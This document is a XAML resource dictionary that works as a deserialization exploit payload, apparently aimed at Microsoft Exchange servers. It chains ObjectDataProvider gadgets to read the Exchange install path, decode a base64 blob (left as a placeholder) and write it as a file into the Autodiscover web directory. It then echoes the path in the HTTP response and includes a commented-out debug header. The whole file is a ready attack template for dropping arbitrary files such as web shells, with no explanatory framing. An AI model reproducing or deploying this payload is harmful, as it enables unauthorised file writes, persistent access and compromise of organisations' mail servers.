<ResourceDictionary xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
		    xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml" 
		    xmlns:s="clr-namespace:System;assembly=mscorlib"
		    xmlns:w="clr-namespace:System.Web;assembly=System.Web">

	<ObjectDataProvider x:Key="cur" ObjectInstance="{x:Static w:HttpContext.Current}" MethodName=""/>	
	<ObjectDataProvider x:Key="gr" ObjectInstance="{StaticResource cur}" MethodName="get_Response"></ObjectDataProvider>
	<ObjectDataProvider x:Key="gh" ObjectInstance="{StaticResource gr}" MethodName="get_Headers"></ObjectDataProvider>
	

	<!--Make Path location-->
	<s:String x:Key="root_path" x:FactoryMethod="s:Environment.GetEnvironmentVariable" x:Arguments="ExchangeInstallPath"/>
	<s:String x:Key="save_location" x:FactoryMethod="Concat">
		<x:Arguments>
			<StaticResource ResourceKey="root_path"/>
			<s:String>ClientAccess\Autodiscover\FILE_NAME</s:String>
		</x:Arguments>
	</s:String>


	<!--Decode Part-->
	<s:Array x:Key="FB64" x:FactoryMethod="s:Convert.FromBase64String" x:Arguments="FILE_DATA_ENCODED_BASE64"/>


	<!--Write File-->
	<ObjectDataProvider x:Key="x" ObjectType="{x:Type s:IO.File}" MethodName="WriteAllBytes">
		<ObjectDataProvider.MethodParameters>
			<StaticResource ResourceKey="save_location"/>
			<StaticResource ResourceKey="FB64"/>
		</ObjectDataProvider.MethodParameters>
	</ObjectDataProvider>


	<!--For Debug Purpose-->
	<!--<ObjectDataProvider x:Key="ah" ObjectInstance="{StaticResource gh}" MethodName="Add">
		<ObjectDataProvider.MethodParameters>
			<s:String>7HEKNIGHT</s:String>
			<StaticResource ResourceKey="save_location"/>
		</ObjectDataProvider.MethodParameters>
	</ObjectDataProvider>-->


	<!--Set Respond-->
	<ObjectDataProvider x:Key="wr" ObjectInstance="{StaticResource gr}" MethodName="Write">
		<ObjectDataProvider.MethodParameters>
			<StaticResource ResourceKey="save_location"/>
		</ObjectDataProvider.MethodParameters>
	</ObjectDataProvider>


	<!--End code-->
	<ObjectDataProvider x:Key="grr" ObjectInstance="{StaticResource cur}" MethodName="get_Response"/>
	<ObjectDataProvider x:Key="e" ObjectInstance="{StaticResource grr}" MethodName="End"/>
</ResourceDictionary>
